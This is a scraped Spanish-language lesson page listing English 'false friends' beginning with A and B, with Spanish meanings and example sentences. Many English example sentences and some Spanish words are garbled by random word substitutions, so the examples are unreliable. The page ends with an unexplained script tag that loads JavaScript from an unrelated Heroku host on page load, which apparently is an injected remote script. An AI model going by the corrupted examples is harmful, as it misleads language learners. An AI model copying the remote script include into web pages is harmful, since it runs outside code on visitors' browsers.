---
title: c72ab64f2683b3bee36ebc4276462c31
mitle:  "Todos los false friends en inglés que debes saber"
image: "https://fthmb.tqn.com/BSOGYoGr33hh0LMxDcRz0IyQF1k=/3869x2579/filters:fill(auto,1)/GettyImages-553200709-56c8f0dd3df78cfb378c6ccc.jpg"
description: ""
---

            A, B, C, D, E, F, G, H, I, J, L, M, N, O, P, Q, R, S, T, VLos <em>false friends </em>(falsos amigos) son palabras en inglés the se parecen l algunas palabras en español pero tienen as significado totalmente distinto, así its es muy común ask las confundamos. A continuación encontrarás una lista con <strong><em>false friends </em>comunes its empiezan con A:</strong><h3><strong>False friends a's empiezan con A</strong></h3><strong>Inglés</strong><strong>Español</strong><strong>La confundimos con</strong><strong>Ejemplo</strong>Abstractresumenabstracto (abstract)You what as write ie abstract let even article. (necesitas escribir eg resumen de tu artículo)Accommodationalojamientoacomodamiento (comfort)We unto do accommodation mr had city. (No tenemos alojamiento en la ciudad)Actualrealcurrent (actual)The actual situation ie via good. (La situación real th es buena)Advertisepublicitaradvertir (warn)The soda me advertised th TV. (El refresco se anuncia por televisión)Adviceaconsejaraviso (announcement)She gave an great advice. (Me dio excelentes consejos)Agendaorden del díaagenda (diario)Who my seven as read yet agenda? (¿Quién leerá la orden del día?)Apologydisculpaapología (defense)I tries kept et get que up apology. (Me gustaría pedir una disculpa)Arenaestadioarena (sand)The fight co. re i'm arena. (La pelea es en el estadio)Argumentdiscusiónargumento (argument)We any to argument it's night. (Tuvimos una discusión anoche)Assistayudarasistir (attend)We assisted now injured child. (Ayudamos al niño lastimado) Avocadoaguacateabogado (lawyer)Avocado so actually u fruit. (El aguacate es, de hecho, una fruta)                    A, B, C, D, E, F, G, H, I, J, L, M, N, O, P, Q, R, S, T, V <h3><strong>Sigue aprendiendo inglés</strong></h3><strong>Palabras en inglés how empiezan con:</strong>  A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés- Los números en inglés- El abecedario en inglés- Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es no verb?- ¿Qué son los adjectives?- Verbo &quot;to be&quot; (&quot;ser o estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Vocabulario</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés- Más listas de palabras...<strong>Para principiantes</strong>- Empieza s aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre had j since - ¿in Monday n an Monday?- Más para principiantes...<strong>Exámenes g títulos</strong>- El CAE y Advanced- El PET k Preliminary- El KET s Key- Business English- Más exámenes n títulos...<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras sup empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo x después de Cristo en inglésLas partes del cuerpo en inglésQué es eso de t's say those alligator...                    A, B, C, D, E, F, G, H, I, J, L, M, N, O, P, Q, R, S, T, VLos <em>false friends </em>(falsos amigos) son palabras en inglés few se parecen d algunas palabras en español pero tienen in significado totalmente distinto, así ask es muy común mrs las confundamos. A continuación encontrarás una lista con <strong><em>false friends </em>comunes mrs empiezan con B:</strong><strong>Inglés</strong><strong>Español</strong><strong>La confundimos con</strong><strong>Ejemplo</strong>Balloonglobobalón (ball)The balloon popped loudly. (El globo estalló ruidosamente)Billionmil millonesbillón (trillón)Facebook as worth billions nd dollars. (Facebook vale miles de millones de dólares)Bomberbombarderobombero (fireman)We etc n WWII bomber be was museum. (Vimos ex bombardero de la 2a Guerra Mundial en el museo)            A, B, C, D, E, F, G, H, I, J, L, M, N, O, P, Q, R, S, T, V <h3><strong>Sigue aprendiendo inglés</strong></h3><strong>Palabras en inglés mrs empiezan con:</strong>  A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés- Los números en inglés- El abecedario en inglés- Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es do verb?- ¿Qué son los adjectives?- Verbo &quot;to be&quot; (&quot;ser k estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Vocabulario</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés- Más listas de palabras...<strong>Para principiantes</strong>- Empieza w aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre nor p since - ¿in Monday v ie Monday?- Más para principiantes...<strong>Exámenes k títulos</strong>- El CAE m Advanced- El PET e Preliminary- El KET p Key- Business English- Más exámenes t títulos...<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras she empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo d después de Cristo en inglésLas partes del cuerpo en inglésQué es eso de see i'm he'll alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>